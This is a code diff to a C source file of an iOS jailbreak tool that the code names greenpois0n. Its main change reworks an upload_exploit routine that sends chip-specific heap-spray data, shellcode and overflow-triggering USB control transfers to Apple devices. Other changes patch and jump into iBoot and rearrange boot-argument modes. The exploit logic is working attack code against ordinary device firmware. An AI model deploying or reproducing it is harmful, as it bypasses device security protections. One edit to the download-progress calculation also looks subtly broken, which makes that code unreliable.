@@ -15,8 +15,8 @@
 #include "payloads/iBSS.n18ap.h"
 #include "payloads/iBSS.n81ap.h"
 #include "payloads/iBoot.k66ap.h"
-#include "payloads/iBoot.n88ap.h"
 #include "payloads/iBoot.k48ap.h"
+#include "payloads/iBoot.n88ap.h"
 #include "payloads/iBoot.n90ap.h"
 #include "payloads/iBoot.n18ap.h"
 #include "payloads/iBoot.n81ap.h"
@@ -33,7 +33,7 @@ int recovery_callback(irecv_client_t client, const irecv_event_t* event) {
 }
 
 void download_callback(ZipInfo* info, CDFile* file, size_t progress) {
-	double value = ((double) progress / (double) info->length) * 100.0;
+	double value = ((double) progress * 100.0);
 	progress_callback(value, user_object);
 }
 
@@ -310,25 +310,28 @@ int upload_firmware_payload(char* type) {
 
 int upload_exploit() {
 	irecv_error_t error = 0;
-	unsigned int i;
-	unsigned char shellcode[0x800];
+	unsigned int i = 0;
 	unsigned char buf[0x800];
-	unsigned int load_address = 0x84000000;
-	unsigned int shellcode_address = 0x84023001;
-	if (device->chip_id == 8930) {
-		shellcode_address = 0x8402B001;
-	}
-	unsigned int stack_address = 0x84033F98;
-	if (device->chip_id == 8930) {
-		stack_address = 0x8403BF9C;
-	}
+	unsigned char shellcode[0x800];
 	unsigned int max_size = 0x24000;
+	unsigned int load_address = 0x84000000;
+	unsigned int stack_address = 0x84033F98;
+	unsigned int shellcode_address = 0x84023001;
+	unsigned int shellcode_length = 0;
+
 	if (device->chip_id == 8930) {
 		max_size = 0x2C000;
+		stack_address = 0x8403BF9C;
+		shellcode_address = 0x8402B001;
+	}
+	if (device->chip_id == 8920) {
+		max_size = 0x24000;
+		stack_address = 0x84033FA4;
+		shellcode_address = 0x84023001;
 	}
 
-	unsigned int shellcode_length = sizeof(exploit);
 	memset(shellcode, 0x0, 0x800);
+	shellcode_length = sizeof(exploit);
 	memcpy(shellcode, exploit, sizeof(exploit));
 	
 	debug("Resetting device counters\n");
@@ -339,7 +342,7 @@ int upload_exploit() {
 	}
 
 	memset(buf, 0xCC, 0x800);
-	for(i=0;i<0x800;i+=0x40) {
+	for(i = 0; i < 0x800; i += 0x40) {
 		unsigned int* heap = (unsigned int*)(buf+i);
 		heap[0] = 0x405;
 		heap[1] = 0x101;
@@ -347,20 +350,28 @@ int upload_exploit() {
 		heap[3] = stack_address;
 	}
 
-	printf("sent data to copy: %X\n", irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000));
+	debug("Sending chunk headers\n");
+	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
+
 	memset(buf, 0xCC, 0x800);
-	for(i=0; i<(max_size - 0x800 * 3); i+=0x800) irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
-	printf("padded to %X\n", (load_address + max_size));
-	printf("sent shellcode: %X has real length %X\n", irecv_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000), shellcode_length);
-	// this is the exploit part
+	for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
+		irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
+	}
+
+	debug("Sending exploit payload\n");
+	irecv_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000);
+
+	debug("Sending fake data\n");
 	memset(buf, 0xBB, 0x800);
-	printf("never freed: %X\n", irecv_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000));
-	printf("sent fake data to timeout: %X\n", irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10));
-	printf("sent exploit to heap overflow: %X\n", irecv_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000));
+	irecv_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000);
+	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);
+
+	debug("Executing exploit\n");
+	irecv_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000);
 
 	irecv_reset(client);
 	irecv_finish_transfer(client);
-	printf("[.] exploit sent.\n");
+	debug("Exploit sent\n");
 
 	debug("Reconnecting to device\n");
 	client = irecv_reconnect(client, 2);
@@ -461,14 +472,36 @@ int boot_ramdisk() {
 	irecv_setenv(client, "auto-boot", "false");
 	irecv_saveenv(client);
 
-	debug("Loading and patching iBoot\n");
-	irecv_send_command(client, "go image load 0x69626F74 0x41000000");
-	irecv_send_command(client, "go memory move 0x41000040 0x41000000 0x48000");
-	irecv_send_command(client, "go patch 0x41000000 0x48000");
-	irecv_send_command(client, "go jump 0x41000000");
+	debug("Loading iBoot\n");
+	error = irecv_send_command(client, "go image load 0x69626F74 0x41000000");
+	if(error != IRECV_E_SUCCESS) {
+		error("Unable to execute iBSS payload\n");
+		return -1;
+	}
+
+	debug("Shifting iBoot\n");
+	error = irecv_send_command(client, "go memory move 0x41000040 0x41000000 0x48000");
+	if(error != IRECV_E_SUCCESS) {
+		error("Unable to execute iBSS payload\n");
+		return -1;
+	}
+
+	debug("Patching iBoot\n");
+	error = irecv_send_command(client, "go patch 0x41000000 0x48000");
+	if(error != IRECV_E_SUCCESS) {
+		error("Unable to execute iBSS payload\n");
+		return -1;
+	}
+
+	debug("Jumping into iBoot\n");
+	error = irecv_send_command(client, "go jump 0x41000000");
+	if(error != IRECV_E_SUCCESS) {
+		error("Unable to execute iBSS payload\n");
+		return -1;
+	}
 
 	debug("Reconnecting to device\n");
-	client = irecv_reconnect(client, 10);
+	client = irecv_reconnect(client, 5);
 	if (client == NULL) {
 		error("Unable to boot the device tethered\n");
 		return -1;
@@ -487,7 +520,7 @@ int boot_ramdisk() {
 
 	debug("Initializing greenpois0n in iBoot\n");
 	irecv_send_command(client, "go");
-	//return 0;
+
 	//irecv_setenv(client, "boot-args", "0");
 	irecv_setenv(client, "auto-boot", "true");
 	irecv_saveenv(client);
@@ -498,7 +531,6 @@ int boot_ramdisk() {
 		return -1;
 	}
 
-	//return 0;
 	debug("Executing ramdisk\n");
 	error = irecv_send_command(client, "go ramdisk 1 1");
 	if(error != IRECV_E_SUCCESS) {
@@ -514,7 +546,7 @@ int boot_ramdisk() {
 	}
 
 	debug("Moving ramdisk\n");
-	error = irecv_send_command(client, "go memory copy 0x41000040 0x44000000 0x100000");
+	error = irecv_send_command(client, "go memory move 0x41000040 0x44000000 0x100000");
 	if(error != IRECV_E_SUCCESS) {
 		error("Unable to execute iBSS payload\n");
 		return -1;
@@ -537,10 +569,33 @@ int boot_tethered() {
 	irecv_setenv(client, "auto-boot", "false");
 	irecv_saveenv(client);
 
-	debug("Loading and patching iBoot\n");
-	irecv_send_command(client, "go image load 0x69626F74 0x41000000");
-	irecv_send_command(client, "go patch 0x41000000 0x38000");
-	irecv_send_command(client, "go jump 0x41000040");
+	debug("Loading iBoot\n");
+	error = irecv_send_command(client, "go image load 0x69626F74 0x41000000");
+	if(error != IRECV_E_SUCCESS) {
+		error("Unable to execute iBSS payload\n");
+		return -1;
+	}
+
+	debug("Shifting iBoot\n");
+	error = irecv_send_command(client, "go memory move 0x41000040 0x41000000 0x48000");
+	if(error != IRECV_E_SUCCESS) {
+		error("Unable to execute iBSS payload\n");
+		return -1;
+	}
+
+	debug("Patching iBoot\n");
+	error = irecv_send_command(client, "go patch 0x41000000 0x48000");
+	if(error != IRECV_E_SUCCESS) {
+		error("Unable to execute iBSS payload\n");
+		return -1;
+	}
+
+	debug("Jumping into iBoot\n");
+	error = irecv_send_command(client, "go jump 0x41000000");
+	if(error != IRECV_E_SUCCESS) {
+		error("Unable to execute iBSS payload\n");
+		return -1;
+	}
 
 	debug("Reconnecting to device\n");
 	client = irecv_reconnect(client, 10);
@@ -549,6 +604,7 @@ int boot_tethered() {
 		return -1;
 	}
 
+	//irecv_setenv(client, "boot-args", "0");
 	irecv_setenv(client, "auto-boot", "true");
 	irecv_saveenv(client);
 
@@ -563,11 +619,7 @@ int boot_tethered() {
 	debug("Initializing greenpois0n in iBoot\n");
 	irecv_send_command(client, "go");
 
-	//irecv_setenv(client, "boot-args", "0");
-	irecv_setenv(client, "auto-boot", "true");
-	irecv_saveenv(client);
-
-	irecv_send_command(client, "go fsboot");
+	error = irecv_send_command(client, "go fsboot");
 
 	return 0;
 }
@@ -602,18 +654,6 @@ int execute_ibss_payload() {
 			return -1;
 		}
 
-		error = irecv_setenv(client, "auto-boot", "true");
-		if(error != IRECV_E_SUCCESS) {
-			error("Unable to execute iBSS payload\n");
-			return -1;
-		}
-
-		error = irecv_saveenv(client);
-		if(error != IRECV_E_SUCCESS) {
-			error("Unable to execute iBSS payload\n");
-			return -1;
-		}
-
 		if(boot_ramdisk() < 0) {
 			error("Unable to boot device into tethered mode\n");
 			return -1;
@@ -627,63 +667,16 @@ int execute_ibss_payload() {
 			return -1;
 		}
 	}
-	// If boot-args is 2 then boot tethered in verbose (needed?)
+	// If boot-args is 2, then don't boot kernel, just load iBSS payload
 	else if(!strcmp(bootargs, "2")) {
-		debug("Booting device in verbose mode\n");
-		if(boot_verbose() < 0) {
-			error("Unable to boot device into verbose mode\n");
-			return -1;
-		}
-	}
-	// If boot-args is 3, then don't boot kernel, just execute payload
-	else if(!strcmp(bootargs, "3")) {
 		debug("Booting iBSS in payload mode\n");
 		return 0;
 	}
-	// This is for testing!
-	//   it will alternate between booting ramdisk and filesystm
-	else if(!strcmp(bootargs, "4")) {
-		debug("Booting ramdisk in debug mode\n");
-		error = irecv_setenv(client, "boot-args", "5");
-		if(error != IRECV_E_SUCCESS) {
-			error("Unable to execute iBSS payload\n");
-			return -1;
-		}
-
-		error = irecv_setenv(client, "auto-boot", "false");
-		if(error != IRECV_E_SUCCESS) {
-			error("Unable to execute iBSS payload\n");
-			return -1;
-		}
-
-		error = irecv_saveenv(client);
-		if(error != IRECV_E_SUCCESS) {
-			error("Unable to execute iBSS payload\n");
-			return -1;
-		}
-
-		if(boot_ramdisk() < 0) {
-			error("Unable to boot jailbreaking ramdisk\n");
-			return -1;
-		}
-		return 0;
-	}
-	else if(!strcmp(bootargs, "5")) {
-		debug("Booting filesystem in debug mode\n");
-		error = irecv_setenv(client, "boot-args", "4");
-		if(error != IRECV_E_SUCCESS) {
-			error("Unable to execute iBSS payload\n");
-			return -1;
-		}
-
-		error = irecv_saveenv(client);
-		if(error != IRECV_E_SUCCESS) {
-			error("Unable to execute iBSS payload\n");
-			return -1;
-		}
-
-		if(boot_tethered() < 0) {
-			error("Unable to boot tethered filesystem\n");
+	// If boot-args is 3 then boot tethered in verbose (needed?)
+	else if(!strcmp(bootargs, "3")) {
+		debug("Booting device in verbose mode\n");
+		if(boot_verbose() < 0) {
+			error("Unable to boot device into verbose mode\n");
 			return -1;
 		}
 	}
